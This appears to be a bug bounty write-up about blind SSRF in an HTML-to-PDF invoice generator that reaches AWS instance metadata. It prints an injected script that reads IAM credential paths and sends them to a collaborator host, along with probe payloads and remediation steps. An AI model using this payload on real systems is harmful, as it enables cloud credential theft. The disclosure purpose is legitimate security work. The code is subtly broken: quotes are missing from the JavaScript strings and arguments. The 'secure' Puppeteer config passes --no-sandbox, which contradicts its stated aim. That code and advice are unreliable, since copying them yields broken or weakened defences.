---
title: "Blind SSRF via HTML-to-PDF Exporter to AWS Cloud Metadata (IMDS)"
description: "Detailed analysis of a blind Server-Side Request Forgery vulnerability in a cloud document generator allowing exfiltration of AWS IAM temporary credentials, yielding a $4,000 bounty."
pubDate: "2024-04-02"
author: "Abubakar Jamilu Bashir"
categories: ["Bug Bounty", "Web Security", "Cloud Security"]
tags: ["ssrf", "aws", "cloud", "bounty", "imds", "metadata", "pdf-generator"]
pin: true
severity: "Critical"
bounty: "$4,000"
cvss: "9.3"
---
# Executive Summary

During an authorized penetration testing and bug bounty program for an enterprise SaaS platform, I identified a critical **Server-Side Request Forgery (SSRF)** vulnerability in the platforms automated invoice and report PDF generator service.

By abusing unescaped HTML template rendering within an internal headless browser instance (wkhtmltopdf/Puppeteer), I achieved internal network pivot and accessed the **AWS Instance Metadata Service (IMDS)**, allowing retrieval of temporary AWS STS role credentials.

---

## Vulnerability Scorecard

- **Vulnerability Type**: Server-Side Request Forgery (CWE-918)
- **Severity**: Critical (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N - **9.3**)
- **Bounty Awarded**: **$4,000**
- **Impact**: Full access to cloud instance IAM roles and internal microservices.

---

## Technical Analysis & Discovery

### 1. The Vulnerable Feature
The application provided a "Download Invoice PDF" feature where users could customize their company header and footer. Intercepting the request in Burp Suite revealed:

```http
POST /api/v1/invoices/generate-pdf HTTP/1.1
Host: app.target-enterprise.com
Authorization: Bearer <AUTH_TOKEN>
Content-Type: application/json

{
  "invoiceId": "INV-98231",
  "template": {
    "headerHtml": "<div class=header><h1>Company Invoice</h1></div>",
    "footerNote": "Thank you for your business!"
  }
}
```

### 2. Identifying Blind SSRF
I tested injecting external resources inside `headerHtml` using an out-of-band Burp Collaborator / Interactsh callback:

```html
<img src="http://burpcollaborator.net/test.png">
<iframe src="http://burpcollaborator.net/iframe"></iframe>
```

Within 2 seconds, DNS and HTTP requests were received by the Collaborator server originating from an AWS EC2 IP address (`User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome`).

### 3. Exfiltrating Internal Data via JavaScript Execution
Because the headless browser executed JavaScript before PDF conversion, we could use synchronous `XMLHttpRequest` or `fetch()` inside the HTML payload to read internal resources and send the content to our collaborator endpoint:

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open(GET, http://169.254.169.254/latest/meta-data/iam/security-credentials/, false);
  xhr.send();
  var roleName = xhr.responseText;

  var xhr2 = new XMLHttpRequest();
  xhr2.open(GET, http://169.254.169.254/latest/meta-data/iam/security-credentials/ + roleName, false);
  xhr2.send();

  var exfil = new Image();
  exfil.src = https://collaborator-domain.net/log?creds= + encodeURIComponent(xhr2.responseText);
</script>
```

### 4. Response & Proof of Concept
The collaborator received the base64-encoded AWS Security Token Service (STS) credentials containing `AccessKeyId`, `SecretAccessKey`, and `Token`.

```json
{
  "Code": "Success",
  "LastUpdated": "2024-04-02T14:22:10Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2024-04-02T20:35:00Z"
}
```

---

## Defensive Engineering & Remediation

### 1. Enforce AWS IMDSv2
Migrate cloud instances from IMDSv1 to **IMDSv2**, which requires session-oriented token authentication via `PUT` headers (`X-aws-ec2-metadata-token-ttl-seconds`), effectively neutralizing blind SSRF attacks:

```bash
# Enforce IMDSv2 via AWS CLI
aws ec2 modify-instance-metadata-options \
    --instance-id i-0123456789abcdef0 \
    --http-tokens required \
    --http-endpoint enabled
```

### 2. Sandbox Headless Browsers
Disable local network access and file system access in Puppeteer / Chromium:

```javascript
// Secure Puppeteer Configuration
const browser = await puppeteer.launch({
  args: [
    --no-sandbox,
    --disable-setuid-sandbox,
    --disable-web-security=false,
    --disable-local-storage
  ]
});

const page = await browser.newPage();
// Block navigation to non-whitelisted IP ranges (169.254.169.254, 10.0.0.0/8, 127.0.0.1)
await page.setRequestInterception(true);
page.on(request, (req) => {
  const url = new URL(req.url());
  if (isPrivateIP(url.hostname)) {
    req.abort();
  } else {
    req.continue();
  }
});
```

---

## Responsible Disclosure Timeline

- **2024-04-02**: Vulnerability discovered and reported with complete reproducible PoC.
- **2024-04-02**: Security team triaged and escalated to **Critical (CVSS 9.3)**.
- **2024-04-03**: Temporary hotfix deployed (IMDSv2 enforced + network egress filtering).
- **2024-04-05**: Permanent sandboxed PDF worker deployed to production.
- **2024-04-08**: **$4,000 Bounty** awarded.
